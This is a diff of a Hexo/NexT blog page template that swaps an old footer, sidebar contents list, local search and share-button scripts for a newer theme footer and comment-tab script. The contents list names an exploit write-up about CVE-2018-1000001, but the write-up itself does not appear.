-                    <a href="https://thinkycx.me/" title="https://thinkycx.me/" rel="noopener" target="_blank">thinkycx</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
-            
-          
-          
-
-        </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE–2018-1000001"><span class="nav-number">1.</span> <span class="nav-text">CVE–2018-1000001</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyexp"><span class="nav-number">2.</span> <span class="nav-text">easyexp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#程序创建文件的过程"><span class="nav-number">2.0.1.</span> <span class="nav-text">程序创建文件的过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#程序创建文件夹的过程"><span class="nav-number">2.0.2.</span> <span class="nav-text">程序创建文件夹的过程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用思路"><span class="nav-number">2.0.3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exp"><span class="nav-number">2.0.4.</span> <span class="nav-text">Exp</span></a></li></ol></li></ol></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
-    </div>
-  </aside>
-  
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">sunichi</span>
-
-  
-
-  
-</div>
-
-
-  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.4.4</div>
-
-
-
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.0.1</div>
-
-
-
-
-        
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
 
 <script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
   }
 </script>
 
+    </div>
+  </main>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-  <script>
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.xml";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+  <footer class="footer">
+    <div class="footer-inner">
+      
 
       
 
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">sunichi</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
 
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
+    </div>
+  </footer>
 
-                // show search results
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
 
-                if (isMatch) {
-                  // sort index by position of keyword
+  
 
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
 
-                  // merge hits into slices
 
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
 
-                      // move to next position of hit
 
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
 
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
 
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
 
-                  // sort slices in content by search text's count and hits' count
 
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
 
-                  // select top N slices in content
 
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
 
-                  // highlight title and content
 
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
 
 
 
@@ -1317,43 +386,12 @@
 
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-  
-  <script src="/lib/needsharebutton/needsharebutton.js"></script>
-  <script>
-    
-      pbOptions = {};
-      
-        pbOptions.iconStyle = "default";
-      
-        pbOptions.boxForm = "horizontal";
-      
-        pbOptions.position = "bottomCenter";
-      
-        pbOptions.networks = "Weibo,Wechat,Twitter,Facebook,Evernote";
-      
-      new needShareButton('#needsharebutton-postbottom', pbOptions);
-    
-    
-  </script>
 
 
-  
 
-  
+
+
+
 
   
 
